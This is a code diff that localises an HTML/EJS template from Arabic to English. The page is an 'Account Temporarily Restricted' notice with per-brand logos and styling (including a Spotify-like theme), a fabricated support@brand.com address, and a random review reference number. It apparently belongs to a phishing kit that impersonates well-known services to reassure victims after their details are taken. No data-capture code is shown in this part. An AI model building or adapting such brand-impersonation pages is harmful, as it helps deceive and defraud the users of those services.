@@ -1,5 +1,5 @@
 <!doctype html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
@@ -13,7 +13,7 @@ body{background:var(--bg);color:var(--fg);font-family:system-ui,-apple-system,Ta
 .lock-icon{font-size:56px;margin-bottom:16px;display:block}
 h1{font-size:1.3rem;margin-bottom:10px}
 .sub{font-size:.9rem;opacity:.6;line-height:1.7;margin-bottom:28px}
-.status-box{background:#ffffff08;border-radius:12px;padding:16px 20px;text-align:right;margin-bottom:24px}
+.status-box{background:#ffffff08;border-radius:12px;padding:16px 20px;text-align:left;margin-bottom:24px}
 .status-row{display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid #ffffff08;font-size:.86rem}
 .status-row:last-child{border-bottom:none}
 .status-row .val{opacity:.5}
@@ -260,25 +260,25 @@ body.brand-spotifyaudio{background:#121212;color:#fff}body.brand-spotifyaudio .c
 <div class="card">
   <% if (typeof logos !== 'undefined' && logos[tpl.key]) { %><div style="text-align:center;margin-bottom:16px"><%- logos[tpl.key] %></div><% } else { %><span class="brand-logo"><%= tpl.name %></span><% } %>
   <span class="lock-icon">🔒</span>
-  <h1><%= pageContent.headline || 'الحساب محدود مؤقتاً' %></h1>
-  <p class="sub"><%= pageContent.subheadline || 'جارٍ مراجعة معلوماتك. سيتم إعادة تفعيل حسابك خلال 24-48 ساعة.' %></p>
+  <h1><%= pageContent.headline || 'Account Temporarily Restricted' %></h1>
+  <p class="sub"><%= pageContent.subheadline || 'Your information is under review. Your account will be reactivated within 24-48 hours.' %></p>
 
   <div class="status-box">
     <div class="status-row">
-      <span>الحالة</span>
-      <span class="pending">قيد المراجعة ⏳</span>
+      <span>Status</span>
+      <span class="pending">Under Review ⏳</span>
     </div>
     <div class="status-row">
-      <span>وقت المراجعة المتوقع</span>
-      <span class="val">24-48 ساعة</span>
+      <span>Estimated Review Time</span>
+      <span class="val">24-48 hours</span>
     </div>
     <div class="status-row">
-      <span>التواصل</span>
+      <span>Contact</span>
       <span class="val">support@<%= tpl.name.toLowerCase().replace(/\s/g,'') %>.com</span>
     </div>
   </div>
 
-  <p class="ref">رقم المرجع: REV-<%= Math.random().toString(36).substr(2,8).toUpperCase() %></p>
+  <p class="ref">Reference: REV-<%= Math.random().toString(36).substr(2,8).toUpperCase() %></p>
 </div>
 </body>
 </html>
